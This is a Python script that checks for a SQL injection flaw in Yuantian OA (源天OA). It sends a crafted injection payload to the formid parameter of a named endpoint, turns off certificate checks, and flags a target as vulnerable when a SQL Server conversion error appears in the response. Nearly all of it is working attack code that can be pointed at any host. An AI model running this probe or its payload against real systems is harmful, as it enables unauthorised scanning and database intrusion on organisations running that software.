#!/usr/bin/env python
# coding=utf-8
#存在源天OASQL注入漏洞
import requests, threading
from termcolor import colored
requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if '在将 nvarchar 值' in response.text:
            print(colored('[+]存在源天OASQL注入漏洞', 'red'))
            results = f'{urls}-->存在源天OASQL注入漏洞'
        else:
            print('[-]不存在源天OASQL注入漏洞')
    except:
        print('[-]不存在源天OASQL注入漏洞')


def yuantianOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

